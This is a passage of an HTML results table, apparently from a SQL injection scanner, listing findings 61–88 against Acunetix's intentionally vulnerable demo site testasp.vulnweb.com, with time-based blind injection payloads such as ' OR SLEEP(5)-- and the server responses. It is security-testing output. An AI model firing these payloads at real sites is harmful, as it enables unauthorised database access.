+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_60')">Toggle</span>
+                        <div id="resp_60" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>61</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dhtml%2Fabout%2Ehtml</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_61')">Toggle</span>
+                        <div id="resp_61" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>62</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D2</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_62')">Toggle</span>
+                        <div id="resp_62" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>63</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_63')">Toggle</span>
+                        <div id="resp_63" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>64</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_64')">Toggle</span>
+                        <div id="resp_64" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>65</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_65')">Toggle</span>
+                        <div id="resp_65" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>66</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D1</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_66')">Toggle</span>
+                        <div id="resp_66" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>67</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_67')">Toggle</span>
+                        <div id="resp_67" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>68</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_68')">Toggle</span>
+                        <div id="resp_68" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>69</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_69')">Toggle</span>
+                        <div id="resp_69" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>70</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_70')">Toggle</span>
+                        <div id="resp_70" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>71</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_71')">Toggle</span>
+                        <div id="resp_71" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>72</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_72')">Toggle</span>
+                        <div id="resp_72" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>73</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_73')">Toggle</span>
+                        <div id="resp_73" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>74</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_74')">Toggle</span>
+                        <div id="resp_74" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>75</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_75')">Toggle</span>
+                        <div id="resp_75" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>76</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_76')">Toggle</span>
+                        <div id="resp_76" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>77</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_77')">Toggle</span>
+                        <div id="resp_77" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>78</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_78')">Toggle</span>
+                        <div id="resp_78" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>79</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_79')">Toggle</span>
+                        <div id="resp_79" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>80</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_80')">Toggle</span>
+                        <div id="resp_80" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>81</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td>FORM</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_81')">Toggle</span>
+                        <div id="resp_81" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>82</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_82')">Toggle</span>
+                        <div id="resp_82" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>83</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_83')">Toggle</span>
+                        <div id="resp_83" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>84</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td>GET</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_84')">Toggle</span>
+                        <div id="resp_84" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>85</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D0</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_85')">Toggle</span>
+                        <div id="resp_85" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>86</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td>FORM</td>
+                    <td><code>' AND (SELECT * FROM (SELECT(SLEEP(5))))--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowthread%2Easp%3Fid%3D0</td>
+                    <td><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed....</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_86')">Toggle</span>
+                        <div id="resp_86" class="response-box"><pre>500 - Internal server error.
+Server Error
+500 - Internal server error.
+There is a problem with the resource you are looking for, and it cannot be displayed.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>87</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%2FDefault%2Easp%3F</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Register.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_87')">Toggle</span>
+                        <div id="resp_87" class="response-box"><pre>acuforum register
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Real name:
+Email:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other web-based attacks. It is built using ASP and it is here to help you test Acunetix. The entire content of the forum is erased daily. All the posts are real-life examples of how attackers are trying to break into insecure web applications. Please be careful and do not follow links that are posted by malicious parties.</pre></div>
+                    </td>
+                </tr>
+            
+                <tr class="vulnerable">
+                    <td>88</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%2Fshowforum%2Easp%3Fid%3D1</td>
+                    <td>GET</td>
+                    <td><code>' OR SLEEP(5)--</code></td>
+                    <td>High</td>
+                    <td>http://testasp.vulnweb.com/Login.asp?RetURL=%27+OR+SLEEP%285%29--</td>
+                    <td><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
+Warning: This forum is deliberately vulnerable to SQL Injections, directory traversal, and other...</pre></td>
+                    <td><span class="toggle-button" onclick="toggle('resp_88')">Toggle</span>
+                        <div id="resp_88" class="response-box"><pre>acuforum login
+TEST and Demonstration site for Acunetix Web Vulnerability Scanner
+about - forums - search
+- login - register
+- SQL scanner - SQL vuln help
+Username:
+Password:
+Copyright 2019 Acunetix Ltd.
